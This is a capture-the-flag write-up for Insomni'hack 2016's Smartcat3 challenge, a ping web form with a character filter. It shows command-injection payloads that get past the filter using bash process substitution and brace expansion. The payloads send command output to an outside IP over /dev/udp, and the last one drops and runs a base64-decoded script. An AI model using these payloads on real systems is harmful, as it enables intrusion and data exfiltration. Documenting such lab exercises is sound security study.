#Insomni'hack CTF 2016 : Smartcat3

##Write-up

This challenge was a little bit tricky but fun.
It is based on a website with a form to get the status (Up/Down) of an IP. The source code was avalaible [you can find it here](http://pastebin.com/haAqxW9w)

So, the tricky part was to bypass the `sanity_check` function which parse our input and return TRUE if any of this char is found : ```"$&\;`|*"``` and the result must be send on the port 53 because of the firewall : `# The firewall only allows the strict minimum required for this chall, aka # OUTPUT on udp/53 and icmp. INPUT is port 80 only."`

After some research, it was possible to execute arbitrary command with the following payload : `<(ls>/dev/udp/123.123.123.123/53)` and get the following result in the nc listenner : `ping.cgi`

It was nice, but we needed an other trick because space char is not in `string.ascii_letters, string.digits, string.punctuation` so the sanity_check function return TRUE if we use space.
After some research, we found to following trick : 
In bash, if you use `{}` you can get a string with space like this :
`echo {"Hello","World"}`

>Hello World

So, it was possible the search some flag file in the filesystem like this :
`<({ls,-la,../..}>/dev/udp/123.123.123.123/53)`

And find it on the top root directory :
`<({../../../../../../read_flag,flag}>/dev/udp/192.168.5.104/53)`

But a last part was asked :
`Almost there... just trying to make sure you can execute arbitrary commands....
Write 'Give me a...' on my stdin, wait 2 seconds, and then write '... flag!.
Do not include the quotes. Each part is a different line."`

The easy solution is the following :

```
echo -ne '(echo "Give me a..."; sleep 2; echo "... flag!") | /read_flag flag' | base64
KGVjaG8gIkdpdmUgbWUgYS4uLiI7IHNsZWVwIDI7IGVjaG8gIi4uLiBmbGFnISIpIHwgL3JlYWRfZmxhZyBmbGFn
```

Then :
```
<({base64,-d,KGVjaG8gIkdpdmUgbWUgYS4uLiI7IHNsZWVwIDI7IGVjaG8gIi4uLiBmbGFnISIpIHwgL3JlYWRfZmxhZyBmbGFn}>/tmp/tmpfile.sh
<({bash,/tmp/tmpfile.sh}>/dev/udp/192.168.5.104/53)
```

And get the flag !
Enjoy, thank to [Xer](https://twitter.com/XeR_0x2A) for his help :)
[Rawger](https://twitter.com/_rawger)
